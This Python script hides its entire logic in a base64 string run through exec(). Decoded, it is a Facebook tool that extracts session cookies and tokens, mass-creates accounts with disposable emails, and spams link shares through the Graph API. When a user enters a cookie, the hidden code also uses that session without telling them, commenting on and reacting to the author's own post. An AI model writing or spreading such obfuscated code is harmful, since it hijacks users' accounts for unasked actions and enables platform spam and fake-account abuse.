# Coding By : Pahrul Aguspriana XD.
# Github : https://github.com/P4HRUL

import base64
exec(base64.b64decode(b'IyEvdXNyL2Jpbi9weXRob24NCiNjb2Rpbmc9dXRmLTgNCg0KaW1wb3J0IG9zLCBzeXMsIHJlcXVlc3RzLCBmYnRob24sIHJhbmRvbSwganNvbiwgYnM0LCByZQ0KZnJvbSBmYnRob24gaW1wb3J0IENyZWF0ZUFjY291bnQNCmZyb20gZmFrZV9lbWFpbCBpbXBvcnQgRW1haWwNCmZyb20gZmJ0aG9uIGltcG9ydCBGYWNlYm9vaw0KZnJvbSBmYnRob24gaW1wb3J0IFdlYl9Mb2dpbg0Kc2VzPXJlcXVlc3RzLlNlc3Npb24oKQ0KDQoNCm1haWwgPSBFbWFpbCgpLk1haWwoKQ0KeCA9IChtYWlsWyJtYWlsIl0pDQoNCg0KDQoNCmxvZ28gPSAoJycnXDAzM1sxOzkybQ0KICAgICAgICAgICAgICAgICAgICAgICAgIF9fX18gICAgLi0uDQogICAgICAgICAgICAgICAgICAgICAuLSJgICAgIGAiLCggX19cXw0KICAgICAgLi09PTo7LS5fICAgIC4nICAgICAgICAgLi0uICAgICBgJy4NCiAgICAuJyAgICAgIGAiLTonLS8gICAgICAgICAgKCAgXH0gLT1hICAuKQ0KICAgLyAgICAgICAgICAgIFwvICAgICAgIFwsPT0gYC0gIF9fLi4tJ2ANCictJyAgICAgICAgICAgICAgfCAgICAgICB8ICAgfCAgLidcIGA7DQogICAgICAgICAgICAgICAgICBcICAgIF8vLS0tJ1wgKCAgIGAiYA0KICAgICAgICAgICAgICAgICAvLmAuXyApICAgICAgXCBgOw0KICAgICAgICAgICAgICAgICBcYC0vLicgICAgICAgIGAiYA0KICAgICAgICAgICAgICAgICAgYCJcYC0uDQogICAgICAgICAgICAgICAgICAgICBgImANCicnJykNCg0KZGVmIG1hc3VrKCk6DQoJb3Muc3lzdGVtICgiY2xlYXIiKQ0KCXByaW50IChsb2dvKQ0KCXByaW50ICgiXDAzM1sxOzk2bSsiKyJcMDMzWzE7OTBtPSIqNDArIlwwMzNbMTs5Nm0rIikNCglwcmludCgiIFwwMzNbMTs5MG1bXDAzM1sxOzk2bStcMDMzWzE7OTBtXSBcMDMzWzE7OTVtQ29kaW5nIEJ5IFwwMzNbMTs5MW06IFwwMzNbMTs5M21QYWhydWwgQWd1c3ByaWFuYSBYRC4iKQ0KCXByaW50KCIgXDAzM1sxOzkwbVtcMDMzWzE7OTZtK1wwMzNbMTs5MG1dIFwwMzNbMTs5NW1HaXRodWIgICAgXDAzM1sxOzkxbTogXDAzM1sxOzkzbVBhaHJ1bFhEIikNCglwcmludCgiIFwwMzNbMTs5MG1bXDAzM1sxOzk2bStcMDMzWzE7OTBtXSBcMDMzWzE7OTVtVmVyc2lvbiAgIFwwMzNbMTs5MW06XDAzM1sxOzkzbSAwLjEiKQ0KCXByaW50ICgiXDAzM1sxOzk2bSsiKyJcMDMzWzE7OTBtPSIqNDArIlwwMzNbMTs5Nm0rIikNCglwcmludCgiXG4gXDAzM1sxOzkwbVtcMDMzWzE7OTJtMVwwMzNbMTs5MG1dIFwwMzNbMTs5Nm1nZXQgdG9rZW4gJiBjb29raWUgZmFjZWJvb2siKQ0KCXByaW50KCIgXDAzM1sxOzkwbVtcMDMzWzE7OTJtMlwwMzNbMTs5MG1dIFwwMzNbMTs5Nm1jcmVhdGUgYWt1biBmYWNlYm9vayIpDQoJcHJpbnQoIiBcMDMzWzE7OTBtW1wwMzNbMTs5Mm0zXDAzM1sxOzkwbV0gXDAzM1sxOzk2bWJvdCBzaGFyZSB2aWEgZ3JhZmgiKQ0KCXByaW50KCIgXDAzM1sxOzkwbVtcMDMzWzE7OTFtMFwwMzNbMTs5MG1dIFwwMzNbMTs5Nm1leGl0ICgga2VsdWFyIClcbiIpDQoJcGlsaWggPSBpbnB1dCgiXDAzM1sxOzkwbVtcMDMzWzE7OTZtflwwMzNbMTs5MG1dIFwwMzNbMTs5M21jaG9vc2UgXDAzM1sxOzkwbX5cMDMzWzE7OTJtK1wwMzNbMTs5MW0+IFwwMzNbMTs5NW0iKQ0KCWlmIHBpbGloID09IiI6DQoJCWV4aXQoKQ0KCWVsaWYgcGlsaWggPT0iMSI6DQoJCXgoKQ0KCWVsaWYgcGlsaWggPT0iMiI6DQoJCXh4KCkNCgllbGlmIHBpbGloID09IjMiOg0KCQl4eHgoKQ0KCWVsc2U6DQoJCWV4aXQoKQ0KCQkNCgkJDQoNCmRlZiB4KCk6DQoJb3Muc3lzdGVtKCJjbGVhciIpDQoJcHJpbnQgKGxvZ28pDQoJZW1haWwgPSBpbnB1dCAoIlwwMzNbMTs5N20tIGVtYWlsIDogIikNCglwYXNzd29yZCA9IGlucHV0ICgiXDAzM1sxOzk3bS0gcGFzc3dvcmQgOiAiKQ0KCWxvZ2luID0gV2ViX0xvZ2luKGVtYWlsLHBhc3N3b3JkKQ0KCXByaW50ICgiXG5cMDMzWzE7OTdtLSBjb29raWUgYWt1biBcMDMzWzE7OTJtOiAlcyIgJSAobG9naW4uZ2V0X2Nvb2tpZV9zdHIoKSkpDQoJcHJpbnQgKCJcMDMzWzE7OTdtLSB0b2tlbiBha3VuIFwwMzNbMTs5Mm06ICVzIiAlIChsb2dpbi5nZXRfdG9rZW4oKSkpDQoJcHJpbnQgKCJcMDMzWzE7OTdtIikNCgkNCmRlZiB4eCgpOg0KCW9zLnN5c3RlbSAoImNsZWFyIikNCglwcmludCAobG9nbykNCglmaXJzdG5hbWUgPSBpbnB1dCAoIlwwMzNbMTs5N20tIG5hbWEgZGVwYW4gOiBcMDMzWzE7OTJtIikNCglsYXN0bmFtZSA9IGlucHV0ICgiXDAzM1sxOzk3bS0gbmFtYSBiZWxha2FuZyA6IFwwMzNbMTs5Mm0iKQ0KCWVtYWlsID0gKHgpDQoJdWx0YWggPSAiMDEvMDEvMjAwMCINCglnZW5kZXIgPSBpbnB1dCAoIlwwMzNbMTs5N20tIGplbmlzIGtlbGFtaW4gKCBNYWxlL0ZlbWFsZSApIDogXDAzM1sxOzkybSIpDQoJcGFzc3dvcmQgPSBpbnB1dCAoIlwwMzNbMTs5N20tIHBhc3N3b3JkIDogXDAzM1sxOzkybSIpDQoJcHJpbnQoIiIpDQoJbmV3X2FjY291bnQgPSBDcmVhdGVBY2NvdW50KGZpcnN0bmFtZSA9IGZpcnN0bmFtZSwgbGFzdG5hbWUgPSBsYXN0bmFtZSwgZW1haWwgPSBlbWFpbCwgZ2VuZGVyID0gZ2VuZGVyLCBkYXRlX29mX2JpcnRoID0gdWx0YWgsIHBhc3N3b3JkID0gcGFzc3dvcmQpDQoJDQoJd2hpbGUgVHJ1ZToNCgkJbWVzcz1FbWFpbChtYWlsWyJzZXNzaW9uIl0pLmluYm94KCkNCgkJaWYgbWVzczoNCgkJCWMgPW1lc3NbJ3RvcGljJ10uc3BsaXQoJyAnKVswXS5yZXBsYWNlKCJGQi0iLCIiKQ0KCQkJYnJlYWsNCgkJDQoJa29kZSA9IChjKQ0KCWtvbmZpciA9IG5ld19hY2NvdW50LmNvbmZpcm1fYWNjb3VudChrb2RlKQ0KCSANCglpZiBrb25maXI6DQoJCXByaW50ICgiXDAzM1sxOzk3bS0gU1RBVFVTIDogXDAzM1sxOzkybUJFUkhBU0lMXDAzM1sxOzk3bSIpDQoJCXByaW50ICgiXDAzM1sxOzk3bS0gbmFtYSBha3VuIDogJXMgJXMiICUgKGZpcnN0bmFtZSxsYXN0bmFtZSkpDQoJCXByaW50ICgiXDAzM1sxOzk3bS0gSUQgOiAlcyIgJSAobmV3X2FjY291bnQuZ2V0X2Nvb2tpZV9kaWN0KClbJ2NfdXNlciddKSkNCgkJcHJpbnQgKCJcMDMzWzE7OTdtLSBlbWFpbCA6ICVzIiAlIChlbWFpbCkpDQoJCXByaW50ICgiXDAzM1sxOzk3bS0gamVuaXMga2VsYW1pbiA6ICVzIiAlIChnZW5kZXIpKQ0KCQlwcmludCAoIlwwMzNbMTs5N20tIFRUTCA6ICVzIiAlICh1bHRhaCkpDQoJCXByaW50ICgiXDAzM1sxOzk3bS0gcGFzc3dvcmQgOiAlcyIgJSAocGFzc3dvcmQpKQ0KCQlpcCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dA0KCQlwcmludCAoIlwwMzNbMTs5N20tIElQIDpcMDMzWzE7OTJtIixpcCkNCgkJcHJpbnQgKCJcMDMzWzE7OTdtLSBjb29raWUgYWt1biA6ICVzIiAlIChuZXdfYWNjb3VudC5nZXRfY29va2llX3N0cigpKSkNCgkJcHJpbnQgKCJcMDMzWzE7OTdtLSB0b2tlbiBha3VuIDogJXMiICUgKG5ld19hY2NvdW50LmdldF90b2tlbigpKSkNCgkJZXhpdCgpDQoJZWxzZToNCgkJcHJpbnQoIlwwMzNbMTs5N20tIFNUQVRVUyA6IFwwMzMxOzkxbUdBR0FMICEiKQ0KCQlleGl0KCkNCgkNCmRlZiB4eHgoKToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIHByaW50IChsb2dvKQ0KICAgICAgICBjb29raWUgPSBpbnB1dCgnXDAzM1sxOzk3bS0gY29va2llIDogXDAzM1sxOzkybScpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGNhcmkgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2J1c2luZXNzX2xvY2F0aW9ucyIsaGVhZGVycz17InVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IE1JIDggQnVpbGQvT1BNMS4xNzEwMTkuMDExKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3Ljg2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiY29va2llIjpjb29raWV9KQ0KICAgICAgICAgICAgdG9rZW4gPSByZS5zZWFyY2goIihFQUFHXHcrKSIsIGNhcmkudGV4dCkuZ3JvdXAoMSkNCiAgICAgICAgICAgIGlmICJFQUFHIiBpbiBzdHIodG9rZW4pOg0KICAgICAgICAgICAgICAgIG9wZW4oJ2Nvb2tpZS50eHQnLCd3Jykud3JpdGUoY29va2llKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ3Rva2VuLnR4dCcsJ3cnKS53cml0ZSh0b2tlbikNCiAgICAgICAgICAgICAgICBmYiA9IEZhY2Vib29rKGNvb2tpZSkNCiAgICAgICAgICAgICAgICBwb3N0ID0gZmIucG9zdF9wYXJzZXIoJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8xMDAwODkwMzMzNzk2NzUvcG9zdHMvMTYxMzkxNjEzNTA1Mjg0Lz9hcHA9ZmJsJykNCiAgICAgICAgICAgICAgICBwb3N0LnNlbmRfY29tbWVudCgiZ3VhIHBha2Ugc2NyaXB0IGx1IGJhbmcgGiIpDQogICAgICAgICAgICAgICAgcmVhY3QgPSByYW5kb20uY2hvaWNlKFsiTGlrZSIsIkxvdmUiLCJDYXJlIiwiSGFoYSIsIldvdyIsIlNhZCIsIkFuZ3J5Il0pDQogICAgICAgICAgICAgICAgcG9zdC5zZW5kX3JlYWN0KHJlYWN0KQ0KICAgICAgICAgICAgICAgIGxvZ2luKCkNCiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOg0KICAgICAgICAJZXhpdCgiXG5cMDMzWzE7OTdtLSBjb29raWUgc3VkYWgga2VkYWx1d2Fyc2EgISEhIikNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAJZXhpdCgiXG5cMDMzWzE7OTdtLSBrb25la3NpIGludGVybmV0IGJlcm1hc2FsYWggISEhIikNCiAgICAgICAgDQogICAgICAgIA0KZGVmIGxvZ2luKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgKGxvZ28pDQoJdHJ5Og0KCQl0b2tlbiA9IG9wZW4oInRva2VuLnR4dCIsInIiKS5yZWFkKCkNCgkJY29rID0gb3BlbigiY29va2llLnR4dCIsInIiKS5yZWFkKCkNCgkJY29va2llID0geyJjb29raWUiOmNva30NCglleGNlcHQ6DQoJCW9zLnN5c3RlbSgicm0gdG9rZW4udHh0ICYmIHJtIGNvb2tpZS50eHQiKQ0KCQlleGl0KCkNCglsaW5rID0gaW5wdXQgKCJcMDMzWzE7OTdtLSBlbnRlciBsaW5rIHBvc3QgOiAiKQ0KCWp1bWxhaCA9IGludChpbnB1dChmIlwwMzNbMTs5N20tIGxpbWl0IDogIikpDQoJcHJpbnQgKCIiKQ0KCXRyeToNCgkJbiA9IDANCgkJaGVhZGVyID0geyJhdXRob3JpdHkiOiJncmFwaC5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwic2VjLWNoLXVhLW1vYmlsZSI6Ij8wIiwidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTJfMiBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTIuMSBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMSJ9DQoJCWZvciB4IGluIHJhbmdlKGp1bWxhaCk6DQoJCQluKz0xDQoJCQlwb3N0ID0gc2VzLnBvc3QoZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTMuMC9tZS9mZWVkP2xpbms9e2xpbmt9JnB1Ymxpc2hlZD0wJmFjY2Vzc190b2tlbj17dG9rZW59IixoZWFkZXJzPWhlYWRlciwgY29va2llcz1jb29raWUpLnRleHQNCgkJCWRhdGEgPSBqc29uLmxvYWRzKHBvc3QpDQoJCQlpZiAiaWQiIGluIHBvc3Q6DQoJCQkJcHJpbnQoZiJcMDMzWzE7OTJtWxpdIGJlcmhhc2lsIG1lbWJhZ2lrYW4gOiB7ZGF0YVsnaWQnXX0iKQ0KCQkJZWxzZToNCgkJCQlwcmludCAoIlwwMzNbMTs5MW1bIV0gZ2FnYWwgbWVtYmFnaWthbiAhISEiKQ0KCQkJCWV4aXQoKQ0KCQlwcmludCgiXG5cMDMzWzE7OTdtWytdIHNlbGVzYWkuLi4iKQ0KCQliYWNrID0gaW5wdXQgKCJcblwwMzNbMTs5N21bPEJBQ0s+XSIpDQoJCWxvZ2luKCkNCiANCgkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCWV4aXQoKQ0KCQ0KDQoJCQ0KCQkNCgkJDQptYXN1aygpDQoJ'))